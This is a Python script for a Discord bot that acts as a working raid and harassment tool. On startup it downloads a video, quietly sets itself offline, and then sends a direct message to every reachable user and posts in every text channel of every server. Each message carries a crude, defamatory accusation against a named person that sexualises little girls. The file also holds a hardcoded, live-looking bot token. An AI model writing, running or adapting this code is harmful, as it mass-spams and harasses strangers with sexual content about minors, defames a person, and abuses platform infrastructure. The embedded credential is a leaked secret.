from discord.ext.commands import Bot
from io import BytesIO
from discord import File
import aiohttp, discord, asyncio
from loguru import logger

class b(Bot):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)


    async def on_ready(self):
        async with aiohttp.ClientSession() as session:
            async with session.get("https://cdn.discordapp.com/attachments/1275265830203953264/1297883430469636136/IMG_0162.mp4?ex=673fc163&is=673e6fe3&hm=4cd8785b84610e129a69e36d265d49f168548567db08af2f4166a206c4c439d1&") as response:
                if response.status != 200:
                    raise Exception("invalid URL")
                else:
                    data = await response.read()
        logger.info(f"now massdming users")
        async def y():
            for u in self.users:
                if u.id == 1300970029730234418:
                    continue
                try:
                    await u.send(content = "hi my name is ante i like jerkin my small wee wee to little girls :3", file = File(fp = BytesIO(data), filename = "antejerkinit.mp4"))
                    logger.info(f"mdmed {str(u)}")
                except Exception:
                    pass
            logger.info("finished massdming users now doing guilds")
        async def m():
            logger.info(len(self.guilds))
            for guild in self.guilds:
                if not guild.chunked:
                    await guild.chunk(cache = True)
                logger.info(len(guild.channels))
                for channel in guild.text_channels:
                    try:
                        asyncio.ensure_future(channel.send(content = "hi my name is ante i like jerkin my small wee wee to little girls :3", file = File(fp = BytesIO(data), filename = "antejerkinit.mp4")))
                        logger.info(f"sent it in {str(channel)}")
                    except Exception as e:
                        logger.info(f"failed due to {e}") 
                        pass
            logger.info(f"finished massdming channels")
        asyncio.ensure_future(y())
        asyncio.ensure_future(m())

bot = b(intents = discord.Intents().all(), command_prefix = ".asd,adsa,das,da", help_command = None, auto_update = False, status = discord.Status.offline)

if __name__ == "__main__":
    bot.run("MTIwMzQxOTMxNjIzMDQyMjU0OA.G_zm82.whfSqkAe1q188SfM3q_wkDxqq1CcBKcZLhvgXQ")
